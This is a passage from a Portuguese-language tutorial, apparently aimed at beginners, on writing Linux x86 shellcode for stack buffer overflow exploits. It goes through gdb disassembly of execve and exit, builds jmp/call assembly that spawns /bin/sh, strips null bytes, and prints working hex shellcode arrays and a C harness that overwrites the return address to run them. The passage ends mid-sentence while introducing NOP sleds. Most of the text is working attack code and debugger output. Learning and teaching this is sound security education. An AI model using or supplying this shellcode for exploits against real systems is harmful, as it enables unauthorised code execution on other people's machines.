Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     sub    $0x8,%esp
0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
0x8048164 <main+20>:    push   $0x0
0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax
0x8048169 <main+25>:    push   %eax
0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax
0x804816d <main+29>:    push   %eax
0x804816e <main+30>:    call   0x80483fc <execve>
0x8048173 <main+35>:    add    $0xc,%esp
0x8048176 <main+38>:    mov    %ebp,%esp
0x8048178 <main+40>:    pop    %ebp
0x8048179 <main+41>:    ret
End of assembler dump.
(gdb)

Vamos analisar com calma cada linha disso daih.

0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     sub    $0x8,%esp

Essa tres primeiras linhas correspondem ao processo inicial ou
procedimento preludio.O que essas linhas fazem, primeiro eh salvar o
frame pointer antigo, em seguida faz do atual stack pointer o novo frame
pointer(mov %esp,%ebp), logo apos autoriza espaco para as variaveis
locais, onde no nosso caso eh:
char *comando[2];

Lembrando que ponteiro eh uma word long, entao ele autoriza espaco para
duas words ou 8 bytes como vimos(sub $0x8,%esp).Continuando:

0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)

Essa gigantesta linha aih nao tem nada de complexo como parece,o que
estah sendo feito aih eh a copia do endereco da string "/bin/sh"(valor
0x8058b28) sobre o primeiro ponteiro de comando[] (0xfffffff8(%ebp)).
Isto equivale a: comando[0] = "/bin/sh". Continuando:

0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)

O que foi feito agora eh a copia do valor 0x0, que eh equivalente a NULL,
sobre o segundo ponteiro de comando[].Isto eh equivalente a:
comando[1] = NULL; em nosso codigo shell.c acima.Continuando:

0x8048164 <main+20>:    push   $0x0

Bem amigos, aqui tem inicio a chamada da funcao execve(), lembrando,
o programa empurra os argumentos de execve em ordem inversa(do ultimo
argumento para o primeiro) sobre o stack.Acima vimos que comeca com
0x0 (NULL).Em nosso fonte shell.c temos: execve(comando[0],comando,NULL);
Eh a este NULL que estamos nos referindo.Continuando:

0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax

Aqui ocorre o carregamento do endereco de comando[] sobre o registrador
EAX.Continuando:

0x8048169 <main+25>:    push   %eax

Esse nao possui segredo, o que ocorreu foi que empurramos o endereco
de comando[] que havia sido previamente carregado no registrado EAX
sobre o Stack. Continuando:

0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax

Aqui, carregamos o endereco da string "/bin/sh" sobre o registrador
EAX.Continuando:

0x804816d <main+29>:    push   %eax

Novamente a funcao push(), que nos diz dessa vez que estamos empurrando
os dados do registrado EAX, que nesse caso eh o endereco da string
"/bin/sh", sobre o Stack.Continuando:

0x804816e <main+30>:    call   0x80483fc <execve>

Aqui acontece o seguinte, ocorre a chamada a biblioteca de procedimentos
execve(), ou simplesmente a chamada propriamente dita da funcao execve().
A instrucao chamada empurra o IP(Index Pointer) sobre o Stack.
Lembrando que apos a execucao de execve(), nosso programa termina, entao
as linhas abaixo seguem para voltar as rotinas anteriores:

0x8048173 <main+35>:    add    $0xc,%esp
0x8048176 <main+38>:    mov    %ebp,%esp
0x8048178 <main+40>:    pop    %ebp
0x8048179 <main+41>:    ret

Ocorre aih em cima o seguinte, eh o processo de saida, retorna o velho
frame pointer, faz dele o stual stack pointer em seguida esvazia a pilha
com pop. e ret retorna p/ o sistema.

Agora analisaremos a funcao execve();

(gdb) disassemble execve
Dump of assembler code for function execve:
0x80483fc <execve>:     push   %ebp
0x80483fd <execve+1>:   mov    %esp,%ebp
0x80483ff <execve+3>:   push   %ebx
0x8048400 <execve+4>:   mov    $0xb,%eax
0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
0x804840b <execve+15>:  mov    0x10(%ebp),%edx
0x804840e <execve+18>:  int    $0x80
0x8048410 <execve+20>:  mov    %eax,%edx
0x8048412 <execve+22>:  test   %edx,%edx
0x8048414 <execve+24>:  jge    0x8048426 <execve+42>
0x8048416 <execve+26>:  neg    %edx
0x8048418 <execve+28>:  push   %edx
0x8048419 <execve+29>:  call   0x8050b28 <__normal_errno_location>
0x804841e <execve+34>:  pop    %edx
0x804841f <execve+35>:  mov    %edx,(%eax)
0x8048421 <execve+37>:  mov    $0xffffffff,%eax
0x8048426 <execve+42>:  pop    %ebx
0x8048427 <execve+43>:  mov    %ebp,%esp
0x8048429 <execve+45>:  pop    %ebp
0x804842a <execve+46>:  ret
0x804842b <execve+47>:  nop
End of assembler dump.

O codigo parece complicado a primeira vista,muitas instrucoes em assmebly,
nao tao conhecidas p/ um newbie, como neg,test,jne, mas que sao explicadas
em diversos tutoriais internet a fora, inclusive no meu outro sobre
escrita de shellcodes..:)..Vendido meu peixe, vamos prosseguir.A maioria
das coisas voce jah pode saber somente olhando e comparando com as
explicacoes passadas.Mas vejamos:

0x80483fc <execve>:     push   %ebp
0x80483fd <execve+1>:   mov    %esp,%ebp
0x80483ff <execve+3>:   push   %ebx

Isso eh o mesmo procedimento inicial descrito na explicacao sobre a
funcao main().Pega-se o velho frame pointer e salva-o, em seguida faz do
atual stack pointer o novo frame pointer e depois o empurra no stack.
Continuando:

0x8048400 <execve+4>:   mov    $0xb,%eax

Copia 0xb sobre EAX, que eh o numero 11 em decimal.Este numero corresponde
ao system call execve() na tabela de system calls do sistema.Voce pode
conferir essa tabela em /usr/include/sys/syscall.h , nao sei se isso
varia de linux para linux,mas creio que nao.Continuando:

0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx

O que aconteceu acima foi a copia do endereco de "/bin/sh" sobre EBX.
Continuando:

0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx

Copiamos o endereco de comando[] sobre ECX.

0x804840b <execve+15>:  mov    0x10(%ebp),%edx

Copiamos o endereco do ponteiro nulo (NULL) sobre EDX.

0x804840e <execve+18>:  int    $0x80

Aqui nos mudamos para o modo kernel.

Para o intuito da escrita de shellcodes, isso aqui eh o fim do estudo
da funcao execve(), esses comandos que seguem abaixo, jah sao mais
complexos e acredite, creio serem inuteis para os nossos objetivos!!Uma
vez que se entra no modo kernel, as intrucoes que seguem "nao fazem"
parte do nosso programa.Se quiser ver como a coisa vai se complicando
digite na linha de comandos do gdb "disassemble __normal_errno_location"
e por aih vai.

O estudo detalhado acima nos dah uma boa base para sabermos como
funciona o processo de execucao de nosso programa shell.c em instrucoes
de "maquina".

Veremos abaixo alguns passos que nos ajudarao a escrever nosso shellcode.
Necessitaremos das seguintes coisas p/ podermos escrever nosso shellcode:

1. Termos a string "/bin/sh" terminada nula em algum lugar na memoria.
   Lembrando que estamos querendo executar esse comando, se fosse outro,
   logico que poderiamos mudar isso.

2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
   por uma word null long.Por que isso? lembra do esquema:
   comando[1] = NULL;
   Se faz necessario isso aqui.

3. Copiar 0xb sobre o registrador EAX.
   Lembrando que de acordo com a tabela de system calls que podemos achar
   em /usr/include/sys/syscall.h, o numero decimal correspondente ao
   syscall execve() eh 11 (0xb).

4. Copiar o endereco da string "/bin/sh" sobre o registrador EBX.

5. Copiar o endereco da string "/bin/sh" sobre o registrador ECX.

6. Copiar o endereco da word null long sobre o registrador EDX.

7. Executar a intrucao int $0x80.

Para facilitar o aprendizado veremos como cada um dos passos citados
acima, no nosso exemplo inicial de shellcode:

1. 0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)

2. 0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)

3. 0x8048400 <execve+4>:   mov    $0xb,%eax

4. 0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx

5. 0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx

6. 0x804840b <execve+15>:  mov    0x10(%ebp),%edx

7. 0x804840e <execve+18>:  int    $0x80

O esquema acima eh apenas demonstrativo, ainda faltam alguns passos p/ seguir na
construcao  de um  shellcode eficiente.Por  exemplo,para evitar  que o  programa
continue buscando  instrucoes para  o Stack,  caso a  funcao execve()  falhe.Nos
precisaremos usar um artificio que faca com que o programa saia limpamente, caso
haja falha em execve().Sair limpamente significa voltar a linha de comando,  sem
que o programa  busque dados aleatorios  caso execve() falhe.Para  fazermos isso
basta inserir uma chamada normal de saida junto ao nosso shellcode.Fazemos  isso
da seguinte forma:

Pegamos e compilamos o programa abaixo:

------------------------------------------------------------------------
/* PROGRAMA QUE NOS AJUDARAH A SAIR LIMPAMENTE
   CASO EXECVE() FALHE
   Compile com: gcc -o saida -static -ggdb saida.c
*/

#include <stdio.h>

void main(){
exit(0);
}
-----------------------------------------------------------------------

Compilamos ele entao:
[localhost:/]$ gcc -o saida -static -ggdb saida.c

Logo apos a compilacao,chamamos nosso bom e velho debugador gdb para
vermos como isso fica em asm:

[localhost:/]$gdb saida
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

Em seguida digitamos "disassemble _exit" para que o gdb nos forneca o que
queremos saber.Atencao: digite _exit(com um traco antes, como estah aqui).

(gdb) disassemble _exit
Dump of assembler code for function _exit:
0x80483e4 <_exit>:      push   %ebp
0x80483e5 <_exit+1>:    mov    %esp,%ebp
0x80483e7 <_exit+3>:    push   %ebx
0x80483e8 <_exit+4>:    mov    $0x1,%eax
0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
0x80483f0 <_exit+12>:   int    $0x80
0x80483f2 <_exit+14>:   mov    0xfffffffc(%ebp),%ebx
0x80483f5 <_exit+17>:   mov    %ebp,%esp
0x80483f7 <_exit+19>:   pop    %ebp
0x80483f8 <_exit+20>:   ret
0x80483f9 <_exit+21>:   nop
0x80483fa <_exit+22>:   nop
0x80483fb <_exit+23>:   nop
End of assembler dump.

Podemos facilmente ver algumas coisas, vamos analisar este codigo.

0x80483e4 <_exit>:      push   %ebp
0x80483e5 <_exit+1>:    mov    %esp,%ebp
0x80483e7 <_exit+3>:    push   %ebx

Procedimento inicial, o mesmo esquema descrito para a funcao execve()
acima.Continuando:

0x80483e8 <_exit+4>:    mov    $0x1,%eax

Aqui ele coloca 0x1 (1 em decimal) no registrado EAX.Esse eh o numero
correspondente ao system call exit() na tabela de system calls.
Continuando:

0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx

Aqui copia o endereco de exit, propriamente dito.Por que isso?? Veremos
porque logo abaixo.quando virmos algumas linhas de main().

0x80483f0 <_exit+12>:   int    $0x80

Muda para o modo kernel.

Disassemblando main, teremos:

(gdb) disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     push   $0x0
0x8048155 <main+5>:     call   0x804829c <exit>
0x804815a <main+10>:    add    $0x4,%esp
0x804815d <main+13>:    lea    0x0(%esi),%esi
0x8048160 <main+16>:    mov    %ebp,%esp
0x8048162 <main+18>:    pop    %ebp
0x8048163 <main+19>:    ret
End of assembler dump.

O que nos interessa para entendermos a linha <_exit+9> do codigo asm
de exit() eh somente o seguinte:

0x8048153 <main+3>:     push   $0x0
0x8048155 <main+5>:     call   0x804829c <exit>

Como o Stack pega os argumento de tras para frente, na linha do nosso
programa saida.c: exit(0), em asm teremos:
push $0x0  -> Empurra 0 sobre o Stack.
call exit  -> Chama a funcao exit().

Isso tudo fica armazenado em:
0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx

Eis aih o porque.
Quanto a usarmos 0 em exit(), eh somente porque a maioria dos programas
retornam 0 na saida para indicar que nao possui erros.Se tiver acesso
ao codigo fonte dos programas, verifique, porque isso pode muito bem
mudar.

Como necessitamos inserir uma saida limpa(caso execve() falhe), descrita
no exemplo acima, nossos passos em busca de um shellcode eficiente mudam.
Teremos entao agora:

1. Ter a string "/bin/sh" terminada nula em algum lugar na memoria.

2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
por uma word null long.

3. Copiar 0xb sobre o registrado EAX.

4. Copiar o endereco do endereco da string "/bin/sh" sobre o registrado
   EBX.

5. Copiar o endereco da string "/bin/sh" sobre o registrado ECX.

6. Copiar o endereco da null word long sobre o registrador EDX.

7. Executar a instrucao int $0x80.

* Aqui comecao exit().

8. Copiar 0x1 sobre registrado EAX.

9. Copiar 0x0 sobre o registrador EBX.

10.Executar a instrucao $0x80.

Como podemos ver, para a funcao  exit() nao temos muita coisa,senao tres  linhas
apenas, expliquei tudo aquilo acima porque  quero que voce entenda como a  coisa
funciona.Nao vejo como saber que necessitamos  do passo 9, sem sabermos de  onde
vem esse 0x0.
Lembrando  que eh  para Newbies  que escrevo,  nao o  termo Newbie  do livro  "A
Internet e os  Hackers", onde a  unica coisa que  escapa eh a  capa, tem um  bom
ditado para isso:"Nao julgue o livro  pela capa!", quando falo Newbies, sao  sim
pesquisadores, pessoas  com espirito  com fome  de conhecimento,  mas que por um
motivo ou outro,nao  conseguem acesso a  material de nivel.Manisfestos  a parte,
vamos continuando nossa jornada.

Sabemos os passos que devemos seguir, entao iremos agora formar esses
passos  num esquema de codigos asm para facilitar ainda mais nosso
aprendizado.

O esquema seria mais ou menos o seguinte:

movl endereco_da_string, endereco_do_endereco_da_string
movb $0x0, endereco_do_byte_nulo
movl $0x0, endereco_do_nulo
movl $0xb, %eax
movl endereco_da_string, %ebx
leal endereco_da_string, %ecx
leal string_nula, %edx
int $0x80
movl $0x1, %eax
movl $0x0, %ebx
int $0x80
/bin/sh vem aqui.

Podemos  visualizar  que  estamos  bem  proximo  de  conseguir  efetivar   nosso
shellcode.Mas surge um problema,  nos nao sabemos onde  no espaco da memoria  do
programa alvo  nos iremos  exploitar o  codigo(e a  string que  segue ele  serah
colocada.Uma possivel  solucao para  isso, seria  usar as  instrucoes JMP e CALL
para  circular  nosso  codigo.Essas  instrucoes  podem  usar  enderecamento   IP
relativo, que despreza  que nos podemos  saltar para um  offset do IP  atual sem
necessitar saber  o endereco  exato de  onde na  memoria nos  queremos saltar.Se
colocarmos uma instrucao CALL antes da string "/bin/sh" e uma intrucao JMP  para
ela(instrucao CALL), o endereco da string  serah empurrado sobre o Stack como  o
endereco  de retorno(return  address) quando  CALL for  executado.Exato amigo!!
Acontecerah exatamente isto que  voce estah imaginando.Mas para  isso precisamos
copiar o endereco de retorno sobre um registrador, com isso a intrucao CALL pode
chamar o inicio de nosso codigo.Veremos agora como ficarah nosso esquema em asm:

jmp offset-para-chamar                  # 2 bytes
popl %esi                               # 1 byte
movl %esi, array-offset(%esi)           # 3 bytes
movb $0x0, nullbyte-offset(%esi)        # 4 bytes
movl $0x0, null-offset(%esi)            # 7 bytes
movl $0xb, %eax                         # 5 bytes
movl %esi, %ebx                         # 2 bytes
leal array-offset(%esi), %ecx           # 3 bytes
leal null-offset(%esi), %edx            # 3 bytes
int $0x80                               # 2 bytes
movl $0x1, %eax                         # 5 bytes
movl $0x0, %ebx                         # 5 bytes
int  $0x80                              # 2 bytes
call offset-para-popl                   # 5 bytes
/bin/sh vem aqui                        # 5 bytes

Analizando bem o esquema acima, veremos algumas mudancas, nao nos
conceitos,mas na sintaxe asm propriamente dita, explico tudo isso no
txt sobre shellcodes,mas abaixo segue uma explicacao simples sobre o
esquema acima:

jmp offset-para-chamar                  # 3 bytes
popl %esi                               # 1 byte

Essas duas novas linhas sao responsaveis pela mudanca.jmp, como dito
era saltar para o endereco, nesse caso offset, declarado em
offset-para-chamar. Esse offset eh o endereco de call, apos isso, call
chamarah popl %esi.Continuando:

movl %esi, array-offset(%esi)           # 3 bytes
movb $0x0, nullbyte-offset(%esi)        # 4 bytes
movl $0x0, null-offset(%esi)            # 7 bytes
movl $0xb, %eax                         # 5 bytes
movl %esi, %ebx                         # 2 bytes
leal array-offset(%esi), %ecx           # 3 bytes
leal null-offset(%esi), %edx            # 3 bytes
int $0x80                               # 2 bytes

Acima segue os nossos passos de 1 a 7, referentes aos codigos de execve().
Continuando:

movl $0x1, %eax                         # 5 bytes
movl $0x0, %ebx                         # 5 bytes
int  $0x80                              # 2 bytes

Acima estao os codigos referentes a funcao exit(), descritos nos nossos
passos de 8 a 10.Continuando:

call offset-para-popl                   # 5 bytes
/bin/sh vem aqui                        # 8 bytes

Aih  em cima  podemos ver  a instrucao  call, responsavel  por fazer  o giro  ou
circulo.Essa instrucao  chama a  intrucao popl  lah em  cima.Voce pode  estar se
perguntando  se  esse  giro  nao seria  um  loop  infinito.Na  verdade isso  nao
acontece, lembrando, estamos trabalhando com assembly, como estamos  manipulando
enderecos de memoria, o endereco correspondente a instrucao call que eh  saltada
usando  jmp  no  inicio,  nao  serah  mais  chamado,  logo  nao  existe  um loop
infinito.Acho que as  coisas sao mais  claras para o  pessoal que meche  bem com
"goto". :)

O grafico abaixo pode ajudar voce a compreender melhor tudo o que estah
acontecendo aqui:


Parte inferior                                    Topo da Memoria
da memoria

          buffer         sfp   ret      a       b        c

<---- [JJSSSSSSSSCCss] [ssss] [0xD8]  [0x01]  [0x02]  [0x03]
       ^|^       ^|              |
       |||_______||______________|
        ||_______||
         |________|


Topo do Stack                                     Parte inferior do Stack

Onde:

J -> Refere a intrucao JMP.
C -> Refere a instrucao CALL.
S -> Codigo asm que queremos executar.
s -> Codigo da string que queremos executar ("/bin/sh").

buffer -> Nosso buffer vulneravel a overflow.
sfp -> O frame pointer.
ret -> Endereco de retorno.

A seta indica para onde estah saltando a instrucao.

Espero que tudo tenha clareado mais para voce.Em cima disso, podemos
calcular os offsets necessarios para jmp saltar para call, de call
para popl, do endereco da string para o array, e do endereco da
string p/ a word null long.
Caso alguem possua duvidas de como se descobrir os offsets, lembro
novamente, eh bom aprender assembly!!Mas eu coloquei um esquema bem
detalhado no txt sobre shellcodes.Se quiser ou precisar, de uma olhada
nele.

Seguindo em frente, veremos como nosso codigo ficarah inserindo-o em
um programa C. Somente observe, nao compile ainda.

#include<stdio.h>
#include <stdlib.h>
void main() {
__asm__("
        jmp    0x2a                     # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        int    $0x80                    # 2 bytes
        call   -0x2f                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
");
}

Existe um probleminha amigo, para que o nosso codigo funcione,
necessitamos declarar ele como uma variavel global, para podermos colocar
nosso codigo no Stack ou Segmento Data(onde teremos permissao de escrita)
,transferindo o controle para ele,pois nosso codigo modifica ele mesmo
e muitos sistemas operacionais marcam paginas de codigos read-only(soh
leitura).Para fazermos isso, necessitamos da representacao hexadecimal
do codigo binario.Vejamos abaixo como fazer isso tudo:

* Primeiro compilamos o nosso programa acima, usando a seguinte sintaxe
  na linha de comando:

[localhost:/]$gcc -o shell -g -ggdb shell.c

* Em seguida executamos o debugador.

[localhost:/]$ gdb shell
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details. This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

* Agora vem a parte que se exige mais paciencia do fucador.Muita gente
  acha um saco ter que fazer isso, mas nao tem outro jeito,paciencia
  amigo.O esquema eh que o debugador nos dirah o codigo hexadecimal
  correspondente a cada uma da linha de comando.Para fazer isso voce
  digita o seguinte:

(gdb)disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     jmp    0x804817f <main+47>
0x8048155 <main+5>:     pop    %esi
0x8048156 <main+6>:     mov    %esi,0x8(%esi)
0x8048159 <main+9>:     movb   $0x0,0x7(%esi)
0x804815d <main+13>:    movl   $0x0,0xc(%esi)
0x8048164 <main+20>:    mov    $0xb,%eax
0x8048169 <main+25>:    mov    %esi,%ebx
0x804816b <main+27>:    lea    0x8(%esi),%ecx
0x804816e <main+30>:    lea    0xc(%esi),%edx
0x8048171 <main+33>:    int    $0x80
0x8048173 <main+35>:    mov    $0x1,%eax
0x8048178 <main+40>:    int    $0x80
0x804817a <main+42>:    call   0x8048150 <main>
0x804817f <main+47>:    das
0x8048180 <main+48>:    bound  %ebp,0x6e(%ecx)
0x8048183 <main+51>:    das
0x8048184 <main+52>:    jae    0x80481ee <__new_exitfn+54>
0x8048186 <main+54>:    add    %cl,0x90c35dec(%ecx)
End of assembler dump.

Isso voce jah sabe o que faz(mostra codigo asm do nosso programa),agora
amigo para saber o codigo hexadecimal de cada um desses comandos, voce
terah que digitar o seguinte " x/xb <indice>" como no esquema abaixo:

(gdb) x/xb main+3
0x8048153 <main+3>:     0xeb
(gdb) x/xb main+4
0x8048154 <main+4>:     0x2a
(gdb) x/xb main+5
0x8048155 <main+5>:     0x5e
(gdb) x/xb main+6
0x8048156 <main+6>:     0x89
.
.
.
(gdb) x/xb main+56
0x8048188 <main+56>:    0xec
(gdb) x/xb main+57
0x8048189 <main+57>:    0x5d
(gdb) x/xb main+58
0x804818a <main+58>:    0xc3
(gdb) x/xb main+59
0x804818b <main+59>:    0x90

Voce comecarah com o indice "main+3" e irah ateh quando chegar o
hexadecimal "0x90" que corresponde a instrucao NOP, que serah vista logo
abaixo (essa linha nao deve entrar no nosso shell code).Caso em outro
shellcode feito por voce, isso nao apareca, coloque os hexadecimais ateh
a ultima instrucao da funcao main().

Feito tudo isso, voce colocarah todos as linhas do programa em hexa, numa
variavel global, como no esquema abaixo:

/* Exemplo inicial de shellcode
   Compile com: $gcc -o shell1 shell1.c

 */

#include <stdio.h>

char shellcode[] =
        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

void main() {
   int *retorno;
  retorno = (int *)&retorno + 2;
   (*retorno) = (int)shellcode;

}

Depois de compilado voce pode executar ele normalmente, como no exemplo
abaixo:

[localhost:/]$ gcc -o shell1 shell1.c
[localhost:/]$./shell1
bash$ exit
exit

Como voce  pode ver,  ele funciona!Mas  existe um  pequeno probleminha,como  nos
estamos   querendo   executar   nosso    shellcode   atraves   de   um    buffer
overflow,enchendo-o de caracteres,  logo, um byte  nulo em nosso  shellcode irah
ser considerado como o fim da string, e consequentemente serah o fim frustado de
nosso objetivo.Entao necessitados  retirar todos os  bytes nulos(null bytes)  de
nosso shellcode para  que nosso futuro  exploit nao tenha  problemas em executar
seu alvo.Para fazermos  isso, necessitamos conhecer  um basico de  assembly, mas
vejamos como ficaria para nosso exemplo:

Instrucao com null byte                       Trocar por:
------------------------------------------------------------------------
movb $0x0,0x7(%esi)                         xorl %eax,%eax
                                            movb %eax,0x7(%esi)
movl $0x0,0xc(%esi)                         movl %eax,0xc(%esi)
-------------------------------------------------------------------------
movl $0xb,%eax                              movb $0xb,%al
-------------------------------------------------------------------------
movl $0x1,%eax                              xorl %ebx,%ebx
movl $0x0,%ebx                              movl %ebx,%eax
                                            inc  %eax
-------------------------------------------------------------------------

Como podemos ver, nao ha muita coisa para fazermos no intuito de retirar
os null bytes.Veremos entao como fica o nosso codigo apos a substituicao
dos mesmos:

/* Shellcode com sobstituicao dos null bytes */

#include <stdio.h>

main(){
__asm__("
jmp 0x1f                                #2 bytes
popl %esi                               #1 byte
movl %esi,0x8(%esi)                     #3 bytes
xorl %eax,%eax                          #2 bytes
movb %eax,0x7(%esi)                     #3 bytes
movl %eax,0xc(%esi)                     #3 bytes
movb $0xb,%al                           #2 bytes
movl %esi,%ebx                          #2 bytes
leal 0x8(%esi),%ecx                     #3 bytes
leal 0xc(%esi),%edx                     #3 bytes
int $0x80                               #2 bytes
xorl %ebx,%ebx                          #2 bytes
movl %ebx,%eax                          #2 bytes
inc %eax                                #1 byte
int $0x80                               #2 bytes
call -0x24                              #5 bytes
.string \"/bin/sh\"                     #8 bytes
");
}

Compilamos entao usando a seguinte sintaxe:
[localhost:/]$gcc -ggdb -static -o shellnova1 shellnova1.c

Em seguinte usamos o debugador p/ novamente pegarmos o codigo em hexa:
[localhost:/]$gdb shellnova1
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     jmp    0x8048174 <main+36>
0x8048155 <main+5>:     pop    %esi
0x8048156 <main+6>:     mov    %esi,0x8(%esi)
0x8048159 <main+9>:     xor    %eax,%eax
0x804815b <main+11>:    mov    %al,0x7(%esi)
0x804815e <main+14>:    mov    %eax,0xc(%esi)
0x8048161 <main+17>:    mov    $0xb,%al
0x8048163 <main+19>:    mov    %esi,%ebx
0x8048165 <main+21>:    lea    0x8(%esi),%ecx
0x8048168 <main+24>:    lea    0xc(%esi),%edx
0x804816b <main+27>:    int    $0x80
0x804816d <main+29>:    xor    %ebx,%ebx
0x804816f <main+31>:    mov    %ebx,%eax
0x8048171 <main+33>:    inc    %eax
0x8048172 <main+34>:    int    $0x80
0x8048174 <main+36>:    call   0x8048155 <main+5>
0x8048179 <main+41>:    das
0x804817a <main+42>:    bound  %ebp,0x6e(%ecx)
0x804817d <main+45>:    das
0x804817e <main+46>:    jae    0x80481e8 <__new_exitfn+52>
0x8048180 <main+48>:    add    %cl,0x90c35dec(%ecx)
End of assembler dump.
(gdb) x/xb main+3
0x8048153 <main+3>:     0xeb
(gdb) x/xb main+4
0x8048154 <main+4>:     0x1f
(gdb) x/xb main+5
0x8048155 <main+5>:     0x5e
(gdb) x/xb main+6
0x8048156 <main+6>:     0x89
(gdb) x/xb main+7
0x8048157 <main+7>:     0x76
(gdb) x/xb main+8
0x8048158 <main+8>:     0x08
(gdb) x/xb main+9
0x8048159 <main+9>:     0x31
.
.
.
0x8048178 <main+40>:    0xff

Podemos perfeitamente para por aqui e no nosso shellcode no codigo-fonte
acrescentarmos a string /bin/sh que se refere ao que queremos executar.
Fazendo isso teriamos o seguinte shellcode:

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

Mas se nos quisermos substituir a string /bin/sh por seu correspondente
em hexadecimal, nos devemos continuar pegando os respectivos codigos hexa
pelo debugador, ateh encontrarmos uma intrucao nop que corresponderah ao
fim da funcao main().Vejamos:

Haviamos parado em <main + 40>
Continuando:

(gdb) x/xb main+41
0x8048179 <main+41>:    0x2f
(gdb) x/xb main+42
0x804817a <main+42>:    0x62
(gdb) x/xb main+43
0x804817b <main+43>:    0x69
(gdb) x/xb main+44
0x804817c <main+44>:    0x6e
(gdb) x/xb main+45
0x804817d <main+45>:    0x2f
.
.
.
0x8048183 <main+51>:    0x5d
(gdb) x/xb main+52
0x8048184 <main+52>:    0xc3
(gdb) x/xb main+53
0x8048185 <main+53>:    0x90
(gdb) x/xb main+54
0x8048186 <main+54>:    0x90

Como podemos ver chagamos ateh a instrucao NOP(0x90), logo nao incluiremos
ela em nosso shellcode, devemos entao acrescentar ateh <main+52>, fazendo
entao nosso shellcode ficar assim:

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";


Antes de testarmos esse dito cujo, vou  dar uma breve explicacao do que eh  este
NOP(0x90)  e  porque  usaremos  ele  em  nossos  codigos  de  exploits futuros.A
instrucao NOP  pode ser  considerada como  uma instrucao  vazia, ou uma operacao
nula.Quase todos  os processadores  possuem esta  intrucao e  no nosso  caso, um
sistema linux i386 o hexadecimal correspondente a esta instrucao eh  0x90.Quando
executamos um exploit, necessitamos fazer com que o endereco de retorno  execute
nosso shellcode, mas quando  ele aponta p/ um  endereco com dados diferentes  do
que  de  fato  queremos,  que  eh  o  inicio  do  nosso  shellcode,  ocorre  uma
Segmentation Violation! Ou  simplesmente uma violacao  de segmentacao, e  quando
isto ocorre, nos nao alcancaremos facilmente nosso objeto.A nao ser que chutemos
offsets ateh conseguir achar nosso codigo.Mas isto eh muito trabalhoso, de  modo
que eh mais eficiente enchermos o buffer  com nosso shellcode no meio e o  resto
